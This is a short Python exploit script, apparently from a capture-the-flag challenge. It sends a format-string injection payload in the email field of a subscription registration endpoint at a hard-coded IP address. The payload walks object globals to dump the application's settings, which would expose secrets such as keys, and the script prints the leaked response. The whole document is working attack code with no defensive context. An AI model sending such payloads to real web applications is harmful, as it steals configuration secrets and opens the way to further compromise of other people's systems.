import requests


payload = {'email' : "{user._setupfunc.__globals__[settings].__dict__} {email}"}
r = requests.post('http://52.197.132.74/subscribe/register',payload)
print(r.text)
